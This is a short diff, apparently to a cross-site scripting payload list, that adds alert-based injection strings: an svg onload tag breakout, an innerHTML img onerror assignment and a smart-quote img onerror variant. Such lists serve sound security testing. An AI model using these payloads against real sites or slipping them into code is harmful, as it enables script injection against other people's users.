@@ -1,1 +1,5 @@
 "></tag><svg onload=alert('hacked')>
+
+document.createElement('div').innerHTML = "<img src onerror=alert()>"
+
+“><img onerror=alert(1) src>
